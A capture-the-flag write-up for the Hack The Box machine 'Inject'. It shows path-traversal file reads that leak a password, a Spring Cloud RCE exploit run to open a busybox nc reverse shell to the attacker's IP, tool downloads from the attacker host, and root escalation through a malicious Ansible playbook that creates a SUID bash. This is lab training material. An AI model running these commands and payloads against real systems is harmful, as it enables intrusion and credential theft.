# Inject: Easy

```sh
sudo vim /etc/hosts
# add inject.htb

nmap -T4 -p- -A -Pn -v inject.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    * 8080/tcp: nagios-nsca: Nagios NSCA

* the webpage on port 8080 is for 'Zodd Cloud': a cloud-based solution for storing and sharing files

* the website contains links to a few other pages:

    * /blogs: contains a few blog posts; it gives us two names: 'admin' and 'Brandon Auger'

    * /upload: contains a upload form

    * /register: this leads to a message saying 'Under Construction', indicating that there is no page to login or register

* web scan:

    ```sh
    feroxbuster -u http://inject.htb:8080 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # web scan with small wordlist

    ffuf -c -u "http://inject.htb:8080" -H "Host: FUZZ.inject.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 6657 -s
    # subdomain scan
    ```

* we can try uploading a test page in '/upload', and we can see that a POST call to the '/upload' endpoint is made, following which the response shows 'Only image files are accepted'

* if we upload an ordinary image file like a JPG image file, it is accepted, and we can view our image at '/show_image?img=test.jpg', where 'test.jpg' is the filename of the original image

* if we try replacing 'test.jpg' with a single quote ```'``` or a double quote ```"```, or any other strings like ```../../../etc/passwd```, we get a "500 Internal Server Error" page

* as the box name is 'inject', it could be suggesting some type of injection attack

* before we test for SQLi using ```sqlmap```, and other forms of injection, we can test for basic parameter fuzzing to test the 'img' parameter:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u 'http://inject.htb:8080/show_image?img=FUZZ' -fc 500
    # testing for common payloads in 'img' parameter
    # filter 500 status code
    ```

* ```ffuf``` gives several payloads that give non-500 results; this includes payloads like ```../../../../../../../../../../../../etc/passwd``` and ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd``` with a non-zero response size

* we can confirm if local file read is possible using these payloads:

    ```sh
    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../etc/passwd'
    # this works
    ```

* local file inclusion works using the payload, and we are able to read the ```/etc/passwd``` file: it discloses users 'frank' and 'phil' on the box

* we can read more files using LFI:

    ```sh
    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank/.ssh/id_rsa'
    # check if any user has readable SSH keys

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank/.ssh/authorized_keys'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/phil/.ssh/id_rsa'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/phil/.ssh/authorized_keys'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../etc/resolv.conf'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../etc/hosts'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../etc/issue'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../etc/ssh/sshd_config'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank/.bash_history'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/phil/.bash_history'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/html/.htaccess'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/html/.htpasswd'

    # test for the path found from the error message

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp/.htaccess'
    
    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp/.htpasswd'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp/'
    # lists files in directory
    # this works for any directory
    ```

    * ```/etc/issue``` file discloses the box version Ubuntu 20.04.5

    * ```/etc/ssh/sshd_config``` file shows that user 'phil' is denied SSH access

    * if we enter an invalid file path, we get a path in the error message along with the 500 Server Error: it gives us the path ```/var/www/WebApp/src/main/uploads```

    * if we test only with the path for ```/var/www/WebApp```, we get a list of files and folders

    * similarly, if we give the path to a directory instead of a file, we get the directory contents in the output: we can use this for directory listing

    * the webapp directory listing confirms that it is a Java webapp using Maven

* as we are able to read local files as well as list out local directories, we can continue to check for any sensitive info:

    ```sh
    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank'
    # check all files

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank/.m2'
    # check the non-default directory

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/frank/.m2/settings.xml'
    # gives password for 'phil'

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../home/phil'
    # check all files

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www'
    # 'html' and 'WebApp' subfolders

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp'
    # check all files

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp/pom.xml'
    # lists module versions

    curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java'
    # contains webapp logic
    ```

    * the file at ```/home/frank/.m2/settings.xml``` discloses creds 'phil:DocPhillovestoInject123': we can try using this to login via SSH but it fails for both users

    * the ```/var/www/WebApp``` folder contains several files related to the Maven webapp

    * the file ```/var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java``` contains the core logic of the webapp, but does not contain any secrets

    * the file ```/var/www/WebApp/pom.xml``` includes module versions for multiple components:

        * org.springframework.boot: spring-boot-starter-parent: 2.6.5
        * com.sun.activation: javax.activation: 1.2.0
        * org.springframework.cloud: spring-cloud-function-web: 3.2.2
        * org.webjars: bootstrap: 5.1.3
    
    * to check, we can Google for exploits associated with any of these components

    * this leads to [CVE-2022-22963: a RCE exploit for Spring Cloud 3.2.2](https://www.exploit-db.com/exploits/51577)

* as we have a RCE exploit now for one of the dependencies, we can try using it to get reverse shell:

    ```sh
    sudo tcpdump -i tun0 icmp
    # setup listener for pings

    python3 51577.py --url http://inject.htb:8080/functionRouter --command 'ping -c 3 10.10.14.95'
    # the '/functionRouter' endpoint is required for the exploit
    # we get a 500 Internal Server Error message, but the ping is received on listener

    nc -nvlp 4444
    # setup listener

    python3 51577.py --url http://inject.htb:8080/functionRouter --command 'busybox nc 10.10.14.95 4444 -e sh'
    # run exploit with reverse shell one-liner
    # we get reverse shell
    ```

* in reverse shell:

    ```sh
    whoami
    # 'frank'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    # we can try to switch to user 'phil' using creds found earlier

    su phil
    # this works

    cd

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # unavailable
    ```

* we can use ```linpeas``` for basic enumeration: fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-144-generic, Ubuntu 20.04.5
    * user 'phil' is part of group 'staff'
    * kernel exploit CVE-2021-3493 (Ubuntu OverlayFS) highlighted
    * group writable files include ```/opt/automation/tasks``` and files under ```/var/local```

* we can check the non-default file in ```/opt```:

    ```sh
    ls -la /opt

    ls -la /opt/automation

    ls -la /opt/automation/tasks

    cat /opt/automation/tasks/playbook_1.yml
    ```

    ```yml
    - hosts: localhost
    tasks:
    - name: Checking webapp service
        ansible.builtin.systemd:
        name: webapp
        enabled: yes
        state: started
    ```

* the ```/opt/automation/tasks``` includes a YAML file that checks the webapp service is running using the ```ansible.builtin.systemd``` module for checking systemd units: the service should be enabled and the state should be 'started'

* it is likely that the ```/opt/automation/tasks``` folder is running whatever playbook YAML file are included in it

* we can confirm this using ```pspy``` to check for any background processes or cronjobs: fetch the executable from attacker:

    ```sh
    wget http://10.10.14.95:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` shows multiple commands associated with a cronjob running the Ansible playbook:

    ```sh
    /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml

    /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml

    /bin/sh -c /usr/bin/rm -rf /var/www/WebApp/src/main/uploads/*

    /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/

    /bin/sh -c echo ~root && sleep 0

    mkdir -p /root/.ansible/tmp

    /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1776215282.4632103-55614-238252540273971/AnsiballZ_setup.py
    ```

* the commands show that the binary ```ansible-parallel``` is used to run the Ansible playbook tasks, and then various commands are executed involving ```/root```

* we can try modifying the 'playbook_1.yml' file but this does not work

* we can try [creating a new malicious playbook task](https://dev.to/nolunchbreaks_22/how-hackers-exploit-ansible-for-configuration-attacks-a-technical-deep-dive-30lp) in ```/opt/automation/tasks``` such that it is run before the tasks are cleared again:

    ```sh
    cd /opt/automation/tasks

    vim test.yml
    # correct indentation is required
    # without proper spacing it would not work
    ```

    ```yml
    - hosts: localhost
      tasks:
      - name: test
        shell: 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
    ```

* we can check in a few minutes, as the playbook task is run:

    ```sh
    ls -la
    # the YAML file is cleared

    ls -la /tmp
    # we have a SUID copy of bash

    /tmp/bash -p
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
